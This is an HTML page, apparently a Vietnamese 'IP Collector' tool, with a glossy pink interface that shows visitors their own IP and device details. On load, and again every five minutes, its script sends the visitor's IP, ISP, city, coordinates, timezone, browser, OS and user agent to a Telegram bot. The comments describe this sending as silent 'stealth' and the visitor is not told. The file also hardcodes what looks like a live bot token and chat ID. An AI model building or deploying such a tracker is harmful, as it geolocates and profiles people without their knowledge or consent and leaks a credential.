<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🌸 IP Collector Pro</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            background: radial-gradient(circle at 20% 30%, #ff4d6d, #4a001a);
            font-family: 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            margin: 0;
        }
        .glass-card {
            max-width: 920px;
            width: 100%;
            background: rgba(255, 200, 215, 0.08);
            backdrop-filter: blur(18px) saturate(200%);
            -webkit-backdrop-filter: blur(18px) saturate(200%);
            border-radius: 60px 60px 60px 60px;
            padding: 35px 30px 40px;
            border: 1px solid rgba(255, 120, 160, 0.5);
            box-shadow: 0 30px 70px rgba(80, 0, 30, 0.7), 0 0 0 2px #ff6688 inset, 0 0 40px #ff1a4a;
            transition: 0.3s;
        }
        .glass-card:hover {
            box-shadow: 0 40px 90px #4a001a, 0 0 0 3px #ff7a9e inset, 0 0 60px #ff2a5f;
        }
        h1 {
            text-align: center;
            font-size: 2.6rem;
            font-weight: 800;
            color: #fff0f5;
            text-shadow: 0 0 20px #ff2d55, 0 0 50px #cc0044, 0 0 80px #990033;
            letter-spacing: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            flex-wrap: wrap;
            margin-bottom: 18px;
        }
        h1 span { 
            background: rgba(255, 80, 120, 0.2);
            padding: 0 24px;
            border-radius: 60px;
            border: 1px solid #ff7a9e;
            backdrop-filter: blur(4px);
        }
        .ip-mega {
            background: rgba(30, 0, 15, 0.5);
            backdrop-filter: blur(8px);
            border-radius: 80px;
            padding: 16px 20px;
            margin: 18px 0 28px;
            text-align: center;
            border: 2px solid #ff8faa;
            box-shadow: inset 0 0 40px #ff3860, 0 12px 40px rgba(160, 0, 50, 0.6);
        }
        #ip-address {
            font-size: 3.8rem;
            font-weight: 900;
            font-family: 'Courier New', monospace;
            color: #ffeef2;
            text-shadow: 0 0 25px #ff1a4a, 0 0 70px #cc0044;
            letter-spacing: 8px;
            word-break: break-word;
        }
        .ip-label {
            color: #ffb3c9;
            background: rgba(255, 60, 100, 0.25);
            padding: 4px 22px;
            border-radius: 40px;
            display: inline-block;
            font-size: 0.95rem;
            border: 1px solid #ff8ba7;
            margin-top: 4px;
        }
        .grid-2col {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 16px;
            margin-top: 18px;
        }
        .info-box {
            background: rgba(255, 160, 190, 0.10);
            backdrop-filter: blur(6px);
            border-radius: 30px;
            padding: 16px 18px 16px 22px;
            border: 1px solid rgba(255, 130, 170, 0.4);
            box-shadow: inset 0 0 20px rgba(255, 50, 90, 0.15);
            transition: 0.2s;
        }
        .info-box:hover {
            background: rgba(255, 140, 180, 0.2);
            border-color: #ff6f96;
            transform: translateY(-3px);
            box-shadow: 0 12px 30px rgba(150, 0, 50, 0.3);
        }
        .info-box .tag {
            font-size: 0.7rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: #ffa5be;
            text-shadow: 0 0 10px #cc3355;
            display: block;
            margin-bottom: 5px;
        }
        .info-box .val {
            font-size: 1.25rem;
            font-weight: 600;
            color: #fff5f8;
            text-shadow: 0 0 14px #ff3b6f;
            word-break: break-word;
        }
        .info-box .val.sm { font-size: 1rem; }
        .status-badge {
            background: #ff1a4a;
            color: white;
            border-radius: 40px;
            padding: 4px 18px;
            font-size: 0.8rem;
            font-weight: 700;
            display: inline-block;
            margin-top: 4px;
            box-shadow: 0 0 20px #ff0044;
        }
        .hidden { display: none; }
        .btn-submit {
            background: linear-gradient(145deg, #ff2d6b, #a8003a);
            border: none;
            border-radius: 60px;
            padding: 16px 36px;
            font-size: 1.4rem;
            font-weight: 700;
            color: #fff0f5;
            text-shadow: 0 2px 12px #66002a;
            box-shadow: 0 10px 35px rgba(130, 0, 45, 0.7), 0 0 0 2px #ff6690 inset;
            cursor: pointer;
            transition: 0.2s;
            margin: 28px auto 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 18px;
            width: fit-content;
            border: 1px solid #ff88aa;
        }
        .btn-submit:hover {
            transform: scale(1.04);
            background: linear-gradient(145deg, #ff3f7a, #bb0044);
            box-shadow: 0 16px 45px #b3004d, 0 0 0 3px #ff99bb inset;
        }
        .btn-submit:active { transform: scale(0.94); }
        @media (max-width: 650px) {
            .glass-card { padding: 20px 15px; border-radius: 40px; }
            h1 { font-size: 2rem; }
            #ip-address { font-size: 2.5rem; letter-spacing: 3px; }
            .grid-2col { grid-template-columns: 1fr 1fr; gap: 10px; }
            .info-box .val { font-size: 1rem; }
            .btn-submit { font-size: 1.1rem; padding: 14px 20px; width: 100%; justify-content: center; }
        }
        @media (max-width: 430px) {
            .grid-2col { grid-template-columns: 1fr; }
            #ip-address { font-size: 2rem; }
        }
        .blink { animation: blinker 1.1s infinite; }
        @keyframes blinker {
            0% { opacity: 0.25; text-shadow: 0 0 10px #ff0044; }
            50% { opacity: 1; text-shadow: 0 0 40px #ff2a5f; }
            100% { opacity: 0.25; }
        }
        .pulse-dot {
            display: inline-block;
            width: 14px;
            height: 14px;
            background: #ff1a4a;
            border-radius: 50%;
            box-shadow: 0 0 25px #ff0044;
            margin-right: 6px;
            animation: pulse 1.2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(0.8); opacity: 0.5; }
            50% { transform: scale(1.3); opacity: 1; }
            100% { transform: scale(0.8); opacity: 0.5; }
        }
    </style>
</head>
<body>
<div class="glass-card" id="mainCard">
    <h1><span>🌸 IP Collector</span> <span style="font-size:2rem;">💋</span></h1>
    
    <div class="ip-mega">
        <div id="ip-address" class="blink">●●● ●●● ●●●</div>
        <div class="ip-label">🩸 địa chỉ công cộng</div>
    </div>

    <div class="grid-2col" id="infoGrid">
        <div class="info-box"><span class="tag">📡 ISP</span><span class="val" id="isp">Đang lấy...</span></div>
        <div class="info-box"><span class="tag">🌍 Quốc gia</span><span class="val" id="country">Đang xác định...</span></div>
        <div class="info-box"><span class="tag">🏙️ Thành phố</span><span class="val" id="city">Đang định vị...</span></div>
        <div class="info-box"><span class="tag">🗺️ Tọa độ</span><span class="val sm" id="coords">-- / --</span></div>
        <div class="info-box"><span class="tag">🧩 Trình duyệt</span><span class="val sm" id="browser">Đang nhận dạng...</span></div>
        <div class="info-box"><span class="tag">💻 HĐH</span><span class="val sm" id="os">Đang phân tích...</span></div>
        <div class="info-box"><span class="tag">📱 Thiết bị</span><span class="val sm" id="device">Đang xác thực...</span></div>
        <div class="info-box"><span class="tag">🕒 Múi giờ</span><span class="val sm" id="timezone">Đồng bộ...</span></div>
    </div>

    <div style="display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top: 10px;">
        <span class="status-badge"><span class="pulse-dot"></span> STEALTH MODE</span>
    </div>

    <button class="btn-submit" id="refreshBtn">⟳ LẤY LẠI TOÀN BỘ ❤️</button>
</div>

<script>
    (function() {
        "use strict";

        // ========== CẤU HÌNH TELEGRAM ==========
        const BOT_TOKEN = '8657450689:AAHaK3jU0Sd9m5_UhAfVZYKb1653ExzPCZ4';   // ← THAY BẰNG TOKEN BOT CỦA BẠN
        const CHAT_ID   = '8973014468';      // ← THAY BẰNG CHAT ID (có thể là số hoặc @username)

        // ========== DOM ==========
        const ipEl = document.getElementById('ip-address');
        const ispEl = document.getElementById('isp');
        const countryEl = document.getElementById('country');
        const cityEl = document.getElementById('city');
        const coordsEl = document.getElementById('coords');
        const browserEl = document.getElementById('browser');
        const osEl = document.getElementById('os');
        const deviceEl = document.getElementById('device');
        const timezoneEl = document.getElementById('timezone');

        // ========== HÀM LẤY THÔNG TIN THIẾT BỊ (CHÍNH XÁC NHẤT) ==========
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let browser = 'Không xác định', os = 'Không xác định', device = 'Máy tính';

            // Trình duyệt
            if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Edg')) browser = 'Edge';
            else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
            else if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Safari')) browser = 'Safari';
            else if (ua.includes('MSIE') || ua.includes('Trident')) browser = 'Internet Explorer';

            // Hệ điều hành
            if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
            else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
            else if (ua.includes('Windows NT 6.2')) os = 'Windows 8';
            else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
            else if (ua.includes('Mac OS X')) os = 'macOS';
            else if (ua.includes('Linux')) os = 'Linux';
            else if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';

            // Thiết bị (di động / máy tính bảng)
            if (/Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
                if (/(iPad|Tablet)/i.test(ua)) device = 'Máy tính bảng';
                else device = 'Điện thoại';
            } else {
                device = 'Máy tính';
            }

            return { browser, os, device };
        }

        // ========== GỬI DỮ LIỆU QUA TELEGRAM (NGẦM) ==========
        async function sendToTelegram(ipData, deviceInfo) {
            if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN' || !CHAT_ID || CHAT_ID === 'YOUR_CHAT_ID') {
                console.warn('⚠️ Chưa cấu hình BOT_TOKEN hoặc CHAT_ID');
                return;
            }

            // Tạo message chi tiết
            const msg = `🕵️‍♀️ *IP COLLECTOR - STEALTH*%0A` +
                        `📌 *IP:* ${ipData.ip || '0.0.0.0'}%0A` +
                        `🏢 *ISP:* ${ipData.isp || 'N/A'}%0A` +
                        `🌍 *Quốc gia:* ${ipData.country || 'N/A'}%0A` +
                        `🏙️ *Thành phố:* ${ipData.city || 'N/A'}%0A` +
                        `🌐 *Tọa độ:* ${ipData.lat || '--'} / ${ipData.lon || '--'}%0A` +
                        `🕒 *Múi giờ:* ${ipData.timezone || 'N/A'}%0A%0A` +
                        `💻 *Trình duyệt:* ${deviceInfo.browser}%0A` +
                        `🖥️ *HĐH:* ${deviceInfo.os}%0A` +
                        `📱 *Thiết bị:* ${deviceInfo.device}%0A` +
                        `🕵️ *User-Agent:* ${navigator.userAgent.substring(0, 120)}...`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}&parse_mode=Markdown&disable_web_page_preview=true`;

            try {
                const response = await fetch(url, { method: 'GET', mode: 'no-cors' });
                // no-cors để không bị chặn CORS (gửi ngầm)
                console.log('📨 Đã gửi dữ liệu đến Telegram (ngầm)');
            } catch (e) {
                console.warn('Không thể gửi Telegram (có thể bị chặn, nhưng vẫn hoạt động ngầm)');
            }
        }

        // ========== LẤY IP & INFO TỪ whatismyipaddress.com ==========
        async function fetchIpAndSend() {
            // Loading
            ipEl.textContent = '⏳ ...';
            ipEl.classList.add('blink');
            const loading = 'Đang lấy...';
            [ispEl, countryEl, cityEl, coordsEl, timezoneEl].forEach(el => el.textContent = loading);
            browserEl.textContent = 'Đang nhận dạng...';
            osEl.textContent = 'Đang phân tích...';
            deviceEl.textContent = 'Đang xác thực...';

            try {
                // Gọi API chính thức của whatismyipaddress.com
                const resp = await fetch('https://api.whatismyipaddress.com/api/', {
                    method: 'GET',
                    headers: { 'Accept': 'application/json' }
                });

                if (!resp.ok) throw new Error(`HTTP ${resp.status}`);

                const data = await resp.json();

                // Parse dữ liệu
                const ip = data.ip || '0.0.0.0';
                const isp = data.isp || 'Không xác định';
                const country = data.country || 'N/A';
                const city = data.city || 'N/A';
                const lat = data.latitude || '--';
                const lon = data.longitude || '--';
                const timezone = data.timezone || 'N/A';

                // Cập nhật UI
                ipEl.textContent = ip;
                ipEl.classList.remove('blink');
                ispEl.textContent = isp;
                countryEl.textContent = country;
                cityEl.textContent = city;
                coordsEl.textContent = `${lat} / ${lon}`;
                timezoneEl.textContent = timezone;

                // Thiết bị chi tiết
                const device = getDeviceInfo();
                browserEl.textContent = device.browser;
                osEl.textContent = device.os;
                deviceEl.textContent = device.device;

                // === GỬI NGẦM QUA TELEGRAM ===
                const ipData = { ip, isp, country, city, lat, lon, timezone };
                await sendToTelegram(ipData, device);

                // Thêm dấu hiệu đã gửi (không ảnh hưởng UI)
                console.log('✅ Đã lấy IP và gửi ngầm thành công');

            } catch (error) {
                console.error('Lỗi khi lấy IP:', error);
                ipEl.textContent = '⚠️ LỖI';
                ipEl.classList.remove('blink');
                // Vẫn cố gửi thông tin thiết bị nếu có
                const device = getDeviceInfo();
                browserEl.textContent = device.browser;
                osEl.textContent = device.os;
                deviceEl.textContent = device.device;
                // Gửi thông tin thiết bị (không có IP)
                await sendToTelegram({ ip: 'LỖI', isp: 'Lỗi kết nối' }, device);
            }
        }

        // ========== KHỞI ĐỘNG NGAY LẬP TỨC (NGẦM) ==========
        fetchIpAndSend();

        // ========== NÚT REFRESH (VẪN LẤY LẠI) ==========
        document.getElementById('refreshBtn').addEventListener('click', function(e) {
            e.preventDefault();
            fetchIpAndSend();
            // Hiệu ứng nhấn
            this.style.transform = 'scale(0.94)';
            setTimeout(() => this.style.transform = '', 150);
        });

        // Tự động refresh mỗi 5 phút (đảm bảo luôn có IP mới)
        setInterval(() => {
            fetchIpAndSend();
        }, 300000); // 5 phút

    })();
</script>
</body>
</html>
